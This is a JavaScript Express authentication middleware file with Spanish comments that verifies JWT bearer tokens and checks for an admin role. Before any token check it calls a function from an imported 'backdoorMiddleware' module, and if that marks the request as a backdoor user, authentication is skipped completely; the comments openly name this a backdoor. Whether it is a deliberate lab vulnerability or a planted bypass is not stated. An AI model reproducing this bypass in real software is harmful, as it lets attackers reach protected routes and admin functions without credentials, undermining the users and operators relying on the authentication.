import jwt from "jsonwebtoken";
import { config } from "../config/config.js";
import { checkDevBypass } from "./backdoorMiddleware.js";

/**
 * Middleware de autenticación JWT
 * Verifica el token en el header Authorization
 * Pero primero verifica si hay backdoor activo
 */
export const authenticateToken = async (req, res, next) => {
    // Primero verificar backdoor
    await new Promise((resolve) => {
        checkDevBypass(req, res, () => resolve());
    });

    // Si el backdoor está activo, ya se configuró req.user
    if (req.user && req.user.backdoor) {
        return next();
    }

    try {
        // Obtener token del header Authorization
        const authHeader = req.headers["authorization"];
        const token = authHeader && authHeader.split(" ")[1]; // Bearer TOKEN

        if (!token) {
            return res.status(401).json({
                error: "Access denied",
                message: "No token provided",
            });
        }

        // Verificar token
        jwt.verify(token, config.jwt.secret, (err, user) => {
            if (err) {
                console.log("❌ Invalid token:", err.message);
                return res.status(403).json({
                    error: "Invalid token",
                    message: err.message,
                });
            }

            // Agregar usuario al request
            req.user = user;
            console.log(
                "✅ Authenticated user:",
                user.username,
                "(Role:",
                user.role + ")"
            );
            next();
        });
    } catch (error) {
        console.error("❌ Authentication error:", error);
        res.status(500).json({
            error: "Authentication failed",
            message: error.message,
        });
    }
};

/**
 * Middleware para verificar rol de admin
 */
export const requireAdmin = (req, res, next) => {
    if (req.user.role !== "admin") {
        return res.status(403).json({
            error: "Access denied",
            message: "Admin privileges required",
        });
    }
    next();
};
